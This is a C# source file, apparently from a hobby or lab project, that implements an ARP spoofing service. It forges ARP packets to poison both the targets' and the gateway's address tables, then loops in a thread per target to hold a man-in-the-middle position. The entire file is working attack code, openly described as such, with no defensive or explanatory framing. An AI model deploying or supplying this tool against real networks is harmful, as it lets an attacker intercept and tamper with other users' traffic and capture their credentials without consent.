using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using sandbox.Global;
using SharpPcap;

namespace sandbox.Service
{
    public static class SpoofingService
    {
        private static Dictionary<IPAddress, PhysicalAddress> _engagedClientList = new Dictionary<IPAddress, PhysicalAddress>();
        private static int _timeout = 500;

        ///<summary>
        /// Initiates spoofing attack on a target list, creating a thread for each target
        ///</summary>
        /// <param name="targetList"> Targets to become their MITM (Man In The Middle)</param>
        /// <param name="gatewayIpAddress"> Ip address of the router</param>
        /// <param name="gatewayMacAddress"> Mac address of the router</param>
        public static void StartSpoof(Dictionary<IPAddress, PhysicalAddress> targetList, IPAddress gatewayIpAddress, PhysicalAddress gatewayMacAddress)
        {
            _engagedClientList = new Dictionary<IPAddress, PhysicalAddress>();
            Constants.captureDevice.Open();
            foreach (var target in targetList)
            {
                if(target.Key.Equals(gatewayIpAddress))
                    continue;
                ArpPacket arpPacketForGatewayRequest = new ArpPacket(ArpOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), gatewayIpAddress, Constants.myMacAddress, target.Key);
                ArpPacket arpPacketForTargetResponse = new ArpPacket(ArpOperation.Response, target.Value, target.Key, Constants.myMacAddress, gatewayIpAddress);
                EthernetPacket ethernetPacketForGatewayRequest = new EthernetPacket(Constants.captureDevice.MacAddress, gatewayMacAddress, EthernetType.Arp);
                ethernetPacketForGatewayRequest.PayloadPacket = arpPacketForGatewayRequest;
                EthernetPacket ethernetPacketForTargetResponse = new EthernetPacket(Constants.captureDevice.MacAddress, target.Value, EthernetType.Arp);
                ethernetPacketForTargetResponse.PayloadPacket = arpPacketForTargetResponse;
                new Thread(() =>
                {
                    SpoofTarget(ethernetPacketForGatewayRequest, ethernetPacketForTargetResponse, target);
                }).Start();
                _engagedClientList.Add(target.Key, target.Value);
            };
        }

        private static void SpoofTarget(EthernetPacket ethernetPacketForGatewayRequest, EthernetPacket ethernetPacketForTargetResponse, KeyValuePair<IPAddress, PhysicalAddress> target)
        {
            Console.WriteLine("Spoofing target " + target.Value.ToString() + " @ " + target.Key.ToString());
            try
            {
                while (true)
                {
                    Constants.captureDevice.SendPacket(ethernetPacketForGatewayRequest);
                    Constants.captureDevice.SendPacket(ethernetPacketForTargetResponse);
                    Thread.Sleep(_timeout);
                }
            }
            catch (PcapException ex)
            {
                Console.WriteLine("Could not initiate attack [" + ex.Message + "]");
            }
        }
    }
}